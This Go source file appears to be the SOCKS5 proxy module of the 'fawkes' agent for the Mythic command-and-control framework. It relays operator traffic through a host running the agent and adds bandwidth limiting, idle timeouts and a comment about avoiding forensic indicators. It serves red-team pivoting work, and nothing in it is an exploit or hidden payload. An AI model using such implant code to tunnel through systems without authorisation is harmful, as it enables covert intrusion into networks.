package socks

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"sync"
	"time"

	"fawkes/pkg/structs"
)

const (
	socksVersion   = 0x05
	connectCommand = 0x01

	addrTypeIPv4   = 0x01
	addrTypeDomain = 0x03
	addrTypeIPv6   = 0x04

	replySuccess           = 0x00
	replyConnectionRefused = 0x05

	readBufSize     = 32 * 1024 // 32KB per read
	dialTimeout     = 10 * time.Second
	idleReadTimeout = 5 * time.Minute // close idle connections to prevent goroutine/connection leaks
)

// Manager handles all active SOCKS proxy connections
type Manager struct {
	connections     map[uint32]net.Conn
	udpRelays       map[uint32]*udpRelay // UDP ASSOCIATE sessions
	outbound        []structs.SocksMsg
	mu              sync.Mutex
	IdleReadTimeout time.Duration    // exported for testing; defaults to idleReadTimeout const
	Stats           *ConnStats       // connection statistics tracker
	Limiters        *perConnLimiters // per-connection bandwidth limiters
}

// NewManager creates a new SOCKS connection manager
func NewManager() *Manager {
	return &Manager{
		connections:     make(map[uint32]net.Conn),
		udpRelays:       make(map[uint32]*udpRelay),
		IdleReadTimeout: idleReadTimeout,
		Stats:           NewConnStats(100),
		Limiters:        newPerConnLimiters(),
	}
}

// Close closes all active SOCKS connections and releases resources.
// Should be called during agent shutdown to prevent connection leaks.
func (m *Manager) Close() {
	m.mu.Lock()
	defer m.mu.Unlock()
	for id, conn := range m.connections {
		conn.Close()
		delete(m.connections, id)
	}
	for id, relay := range m.udpRelays {
		close(relay.done)
		relay.conn.Close()
		delete(m.udpRelays, id)
	}
	m.outbound = nil
}

// DrainOutbound atomically returns all pending outbound SOCKS messages and clears the queue
func (m *Manager) DrainOutbound() []structs.SocksMsg {
	m.mu.Lock()
	defer m.mu.Unlock()
	if len(m.outbound) == 0 {
		return nil
	}
	msgs := m.outbound
	m.outbound = nil
	return msgs
}

// HandleMessages processes inbound SOCKS messages from Mythic
func (m *Manager) HandleMessages(msgs []structs.SocksMsg) {
	for _, msg := range msgs {
		if msg.Exit {
			m.closeConnection(msg.ServerId)
			m.closeUDPRelay(msg.ServerId, "closed")
			continue
		}

		m.mu.Lock()
		conn, tcpExists := m.connections[msg.ServerId]
		_, udpExists := m.udpRelays[msg.ServerId]
		m.mu.Unlock()

		if udpExists {
			// Forward data to existing UDP relay
			m.forwardUDP(msg.ServerId, msg.Data)
		} else if tcpExists {
			// Forward data to existing TCP connection
			m.forwardData(msg.ServerId, conn, msg.Data)
		} else {
			// New connection — parse SOCKS5 request
			m.handleNewConnection(msg.ServerId, msg.Data)
		}
	}
}

// handleNewConnection parses a SOCKS5 CONNECT request and establishes a TCP connection
func (m *Manager) handleNewConnection(serverId uint32, b64Data string) {
	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil || len(data) < 4 {
		log.Printf("decode error sid=%d", serverId)
		m.queueExit(serverId)
		return
	}

	// Parse SOCKS5 request (RFC 1928 §4)
	if data[0] != socksVersion {
		log.Printf("invalid version sid=%d (ver=%d)", serverId, data[0])
		m.sendReply(serverId, replyConnectionRefused)
		m.queueExit(serverId)
		return
	}

	// Route by command type
	cmd := data[1]
	if cmd == udpAssociateCommand {
		m.handleUDPAssociate(serverId, data)
		return
	}
	if cmd != connectCommand {
		log.Printf("unsupported command sid=%d (cmd=%d)", serverId, cmd)
		m.sendReply(serverId, replyConnectionRefused)
		m.queueExit(serverId)
		return
	}

	// Parse destination address
	addrType := data[3]
	var host string
	var portOffset int

	switch addrType {
	case addrTypeIPv4:
		if len(data) < 10 {
			m.sendReply(serverId, replyConnectionRefused)
			m.queueExit(serverId)
			return
		}
		host = net.IP(data[4:8]).String()
		portOffset = 8
	case addrTypeDomain:
		if len(data) < 5 {
			m.sendReply(serverId, replyConnectionRefused)
			m.queueExit(serverId)
			return
		}
		domainLen := int(data[4])
		if len(data) < 5+domainLen+2 {
			m.sendReply(serverId, replyConnectionRefused)
			m.queueExit(serverId)
			return
		}
		host = string(data[5 : 5+domainLen])
		portOffset = 5 + domainLen
	case addrTypeIPv6:
		if len(data) < 22 {
			m.sendReply(serverId, replyConnectionRefused)
			m.queueExit(serverId)
			return
		}
		host = net.IP(data[4:20]).String()
		portOffset = 20
	default:
		log.Printf("unsupported addr=%d sid=%d", addrType, serverId)
		m.sendReply(serverId, replyConnectionRefused)
		m.queueExit(serverId)
		return
	}

	port := binary.BigEndian.Uint16(data[portOffset : portOffset+2])
	target := net.JoinHostPort(host, fmt.Sprintf("%d", port))

	// Establish TCP connection
	conn, err := net.DialTimeout("tcp", target, dialTimeout)
	if err != nil {
		log.Printf("connect failed %s sid=%d: %v", target, serverId, err)
		m.sendReply(serverId, replyConnectionRefused)
		m.queueExit(serverId)
		return
	}

	// Store the connection, closing any stale connection with the same server_id
	m.mu.Lock()
	if oldConn, exists := m.connections[serverId]; exists {
		oldConn.Close()
	}
	m.connections[serverId] = conn
	m.mu.Unlock()

	// Track connection stats
	m.Stats.RecordConnect(serverId, target)

	// Send success reply
	m.sendReply(serverId, replySuccess)

	// Start reader goroutine to read from the TCP connection and queue outbound data
	go m.readFromConnection(serverId, conn)
}

// forwardData writes decoded SOCKS data to an active TCP connection
func (m *Manager) forwardData(serverId uint32, conn net.Conn, b64Data string) {
	if b64Data == "" {
		return
	}
	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		log.Printf("decode error sid=%d: %v", serverId, err)
		return
	}

	// Apply bandwidth limiting
	rl := m.Limiters.getOrCreate(serverId)
	written := 0
	for written < len(data) {
		allowed := rl.WaitAndAllow(len(data) - written)
		n, err := conn.Write(data[written : written+allowed])
		if err != nil {
			log.Printf("write error sid=%d: %v", serverId, err)
			m.closeConnection(serverId)
			return
		}
		written += n
		m.Stats.RecordSend(serverId, n)
	}
}

// readFromConnection reads data from a TCP connection and queues it as outbound SOCKS messages.
// Uses an idle read timeout to prevent goroutine/connection leaks when remote endpoints
// stop responding without closing the connection (common with firewalls, NAT timeouts,
// or crashed services). Long-running idle connections are also forensic indicators.
func (m *Manager) readFromConnection(serverId uint32, conn net.Conn) {
	buf := make([]byte, readBufSize)
	rl := m.Limiters.getOrCreate(serverId)
	for {
		conn.SetReadDeadline(time.Now().Add(m.IdleReadTimeout))
		n, err := conn.Read(buf)
		if n > 0 {
			m.Stats.RecordRecv(serverId, n)

			// Apply bandwidth limiting — send in chunks if rate limited
			sent := 0
			for sent < n {
				allowed := rl.WaitAndAllow(n - sent)
				encoded := base64.StdEncoding.EncodeToString(buf[sent : sent+allowed])
				m.mu.Lock()
				m.outbound = append(m.outbound, structs.SocksMsg{
					ServerId: serverId,
					Data:     encoded,
					Exit:     false,
				})
				m.mu.Unlock()
				sent += allowed
			}
		}
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				// Idle timeout — check if connection was already closed externally
				m.mu.Lock()
				_, stillActive := m.connections[serverId]
				m.mu.Unlock()
				if !stillActive {
					conn.Close()
					return
				}
				// Connection still active but idle for too long — close it
				log.Printf("idle timeout sid=%d", serverId)
				m.Stats.RecordClose(serverId, "timeout")
			} else if err != io.EOF {
				log.Printf("read error sid=%d: %v", serverId, err)
				m.Stats.RecordClose(serverId, "error")
			} else {
				m.Stats.RecordClose(serverId, "closed")
			}
			// Connection closed, timed out, or errored — send exit and clean up
			m.mu.Lock()
			m.outbound = append(m.outbound, structs.SocksMsg{
				ServerId: serverId,
				Data:     "",
				Exit:     true,
			})
			delete(m.connections, serverId)
			m.mu.Unlock()
			conn.Close()
			return
		}
	}
}

// closeConnection closes a TCP connection and removes it from the map
func (m *Manager) closeConnection(serverId uint32) {
	m.mu.Lock()
	conn, exists := m.connections[serverId]
	if exists {
		delete(m.connections, serverId)
	}
	m.mu.Unlock()

	if exists {
		conn.Close()
	}
	m.Limiters.remove(serverId)
}

// sendReply queues a SOCKS5 reply message back to Mythic
func (m *Manager) sendReply(serverId uint32, replyCode byte) {
	// SOCKS5 reply: VER(1) REP(1) RSV(1) ATYP(1) BND.ADDR(4) BND.PORT(2)
	reply := []byte{socksVersion, replyCode, 0x00, addrTypeIPv4, 0, 0, 0, 0, 0, 0}
	encoded := base64.StdEncoding.EncodeToString(reply)

	m.mu.Lock()
	m.outbound = append(m.outbound, structs.SocksMsg{
		ServerId: serverId,
		Data:     encoded,
		Exit:     false,
	})
	m.mu.Unlock()
}

// SetBandwidthLimit sets the per-connection bandwidth limit in bytes/sec.
// Pass 0 to disable limiting. Only affects new connections.
func (m *Manager) SetBandwidthLimit(bytesPerSec int64) {
	m.Limiters.setConfig(BandwidthConfig{BytesPerSec: bytesPerSec})
}

// GetBandwidthLimit returns the current per-connection bandwidth limit.
func (m *Manager) GetBandwidthLimit() int64 {
	return m.Limiters.getConfig().BytesPerSec
}

// queueExit queues an exit message for a server_id
func (m *Manager) queueExit(serverId uint32) {
	m.mu.Lock()
	m.outbound = append(m.outbound, structs.SocksMsg{
		ServerId: serverId,
		Data:     "",
		Exit:     true,
	})
	m.mu.Unlock()
}
